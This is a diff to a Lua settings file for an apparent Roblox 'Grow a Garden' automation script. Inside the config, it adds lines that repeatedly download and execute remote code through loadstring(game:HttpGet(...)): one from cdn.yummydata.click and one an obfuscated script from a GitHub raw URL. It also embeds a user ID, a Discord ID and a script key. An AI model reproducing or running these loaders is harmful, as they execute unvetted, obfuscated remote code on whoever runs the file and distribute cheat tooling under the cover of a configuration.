@@ -1,4 +1,4 @@
-
+_G.Config={UserID="a675440d-51e7-4396-a617-504754c4658e",discord_id="1206257142630195233",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/gag2"))()end)if s then break end wait(5)end
 _G.GAGConfig = _G.GAGConfig or {
     ["Harvest"] = {
         ["Sell At"] = 80,
@@ -107,3 +107,5 @@ _G.GAGConfig = _G.GAGConfig or {
         ["Hide Crop Visuals"] = true,
     },
 }
+script_key="7ECF8FC9340DD1F67092AC7E1E16CC04";
+local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/gag-obfuscated.lua")end)wait(1)until s;loadstring(r)()
